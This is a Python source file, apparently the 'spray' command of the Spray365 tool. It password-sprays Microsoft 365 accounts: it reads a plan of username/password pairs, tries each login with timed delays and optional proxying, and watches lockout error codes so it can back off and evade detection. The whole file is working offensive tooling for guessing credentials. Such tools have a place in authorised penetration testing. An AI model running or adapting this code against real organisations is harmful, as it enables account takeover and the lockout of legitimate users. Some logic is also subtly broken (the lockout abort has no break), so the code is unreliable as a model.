from __future__ import annotations

import datetime
import json
import os
import time

import click
from click_option_group import AllOptionGroup, optgroup
from colorama import Fore

from ..core.auth_result import AuthResult
from ..core.credential import Credential
from ..core.output import console
from ..generate import helpers as generate_helpers
from ..spray import helpers
from ..spray.helpers import decode_execution_plan_item
from ..spray.spray_exception_wrapper import SprayExceptionWrapper

auth_results: list[AuthResult] = []


@click.command(
    "spray",
    cls=SprayExceptionWrapper,
    help="Password spray user accounts using an existing execution plan",
)
@click.option(
    "--execution_plan",
    "-ep",
    help="File path to execution plan",
    metavar="",
    type=click.File(mode="r"),
    required=True,
)
@click.option(
    "--lockout",
    "-l",
    metavar="",
    type=int,
    help="Number of account lockouts to observe before aborting spraying session (disable with 0)",
    default=5,
    show_default=True,
)
@click.option(
    "-b",
    "--backoff",
    metavar="",
    type=int,
    help="Backoff time in minutes",
)
@click.option(
    "-bt",
    "--backoff_threshold",
    metavar="",
    type=int,
    help="Backoff threshold",
)
@click.option(
    "--resume_index",
    "-R",
    metavar="",
    type=click.IntRange(1),
    help="Resume spraying passwords from this position in the execution plan",
)
@click.option(
    "--ignore_success",
    "-i",
    metavar="",
    is_flag=True,
    help="Ignore successful authentication attempts for users and continue to spray creden"
    "tials. Setting this flag will enable spraying credentials for users even if Spra"
    "y365 has already identified valid credentials.",
    default=False,
    show_default=True,
)
@optgroup.group("Proxy options", cls=AllOptionGroup)
@optgroup.option(
    "--proxy",
    "-x",
    metavar="",
    type=str,
    help="HTTP Proxy URL (format: http[s]://proxy.address:port)",
)
@optgroup.option(
    "--insecure",
    "-k",
    metavar="",
    is_flag=True,
    help="Disable HTTPS certificate verification",
    default=False,
    show_default=True,
)
def command(
    execution_plan: click.File,
    lockout,
    resume_index,
    ignore_success,
    proxy,
    insecure,
    backoff,
    backoff_threshold,
):
    console.print_info("Processing execution plan '%s'" % execution_plan.name)

    raw_execution_plan = ""

    # Create output directory if it doesn't exist
    user = os.path.expanduser("~") 
    if not os.path.exists(f'{user}/.spray365/output/'):
        os.mkdir(f'{user}/.spray365/output/')


    for line in execution_plan:
        raw_execution_plan += line

    credentials: list[Credential] = []

    try:
        credentials = json.loads(
            raw_execution_plan, object_hook=decode_execution_plan_item
        )
    except:
        console.print_error(
            "Unable to process execution plan '%s'. Perhaps it is formatted incorrectly?"
            % execution_plan.name
        )

    number_of_creds_to_spray = len(credentials)
    console.print_info(
        "Identified %d credentials in the provided execution plan"
        % number_of_creds_to_spray
    )

    if resume_index and resume_index > number_of_creds_to_spray:
        console.print_error(
            "Resume index '%d' is larger than the number of credentials (%d) in the execution plan"
            % (resume_index, number_of_creds_to_spray)
        )

    if resume_index:
        console.print_info(
            "Password spraying will continue with credential %d out of %d"
            % (resume_index, number_of_creds_to_spray)
        )

    estimated_spray_duration = generate_helpers.get_spray_runtime(
        credentials[resume_index:]
    )
    spray_completion_datetime = (
        datetime.datetime.now() + datetime.timedelta(seconds=estimated_spray_duration)
    ).strftime("%Y-%m-%d %H:%M:%S")

    console.print_info(
        "Password spraying will take at least %d seconds, and should finish around %s"
        % (estimated_spray_duration, spray_completion_datetime)
    )

    if lockout:
        console.print_info("Lockout threshold is set to %d accounts" % lockout)
    else:
        console.print_warning("Lockout threshold is disabled")

    # Lockout backoff logic and validation
    if not lockout and backoff:
        console.print_warning(
            "Lockout threshold is disabled. Cannot use backoff feature!"
        )
    elif backoff_threshold and not backoff:
        console.print_error("Backoff threshold is set but backoff time is disabled")
    elif backoff and not backoff_threshold:
        console.print_error("Backoff time is set but backoff threshold is disabled")
    else:
        if backoff:
            console.print_info("Backoff time is set to %d minutes" % backoff)
        if backoff_threshold:
            console.print_info("Backoff threshold is set to %d" % backoff_threshold)

    if ignore_success:
        console.print_warning(
            "Ignore Success flag is enabled (this may cause lockouts!)"
        )

    if proxy:
        console.print_info("Proxy (HTTP/HTTPS) set to '%s'" % proxy)

    console.print_info("Starting to spray credentials")

    spray_size = len(credentials)
    lockouts_observed = 0

    if backoff:
        backoffs_observed = 0

    start_offset = resume_index - 1 if resume_index else 0

    credentialed_users: list[str] = []

    for spray_idx in range(start_offset, len(credentials)):
        cred = credentials[spray_idx]

        # Only attempt authentication if we haven't observed valid credentials for the user
        if ignore_success or cred.username not in credentialed_users:
            _print_credential_authentication_output(cred, (spray_idx, spray_size))
            time.sleep(cred.initial_delay)
            auth_result = helpers.authenticate_credential(cred, proxy, insecure)
            _print_credential_authentication_output(
                cred, (spray_idx, spray_size), auth_result
            )
            auth_results.append(auth_result)

            if auth_result.auth_error and auth_result.auth_error.code == 50053:
                lockouts_observed += 1

            # TODO Account Disabled erros seem to be used in smart lockout now.
            elif auth_result.auth_error and auth_result.auth_error.code == 50057:
                lockouts_observed += 1

            if backoff and lockouts_observed >= lockout:

                # Exiting when we hit the backoff threshold
                if backoffs_observed >= backoff_threshold:
                    console.print_error(
                        "Backoff threshold reached. Aborting password spraying"
                    )
                    break

                else:
                    console.print_info(
                        "Lockout threshold reached. Backing off for %d minutes"
                        % backoff
                    )
                    console.print_info(
                        f"Sleeping until {datetime.datetime.now() + datetime.timedelta(minutes=backoff).strftime('%Y-%m-%d %H:%M:%S')}"
                    )

                    time.sleep(backoff * 60)

                    backoff = backoff * 2
                    backoffs_observed += 1
                    lockouts_observed = 0

            if not backoff:
                if lockout and lockouts_observed >= lockout:
                    console.print_error(
                        "Lockout threshold reached, aborting password spray"
                    )

            if auth_result.auth_complete_success:
                credentialed_users.append(cred.username)
        else:
            console.print_spray_output(
                spray_idx + 1,
                spray_size,
                cred.client_id[0],
                cred.endpoint[0],
                cred.user_agent[0],
                cred.username,
                cred.password,
                "%s (Skipped)" % Fore.BLUE,
                None,
                False,
            )

        if spray_idx < spray_size - 1:
            time.sleep(cred.delay)

        spray_idx += 1

    helpers.export_auth_results(auth_results)


def _print_credential_authentication_output(
    credential: Credential,
    spray_position: tuple[int, int],
    auth_result: AuthResult = None,
):
    if auth_result is None:
        status = "%s(waiting...)" % Fore.BLUE
    elif auth_result.auth_complete_success:
        # TODO add notification function here
        status = "%s(Authentication Success)" % Fore.GREEN
    elif auth_result.auth_partial_success:
        status = "%s(Partial Success: %s)" % (
            Fore.LIGHTYELLOW_EX,
            auth_result.auth_error.message,
        )
    else:
        status = "%s(Failed: %s)" % (Fore.RED, auth_result.auth_error.message)

    line_terminator = "\r" if not auth_result else None
    flush_line = True if auth_result else False

    console.print_spray_output(
        spray_position[0] + 1,
        spray_position[1],
        credential.client_id[0],
        credential.endpoint[0],
        credential.user_agent[0],
        credential.username,
        credential.password,
        status,
        line_terminator,
        flush_line,
    )
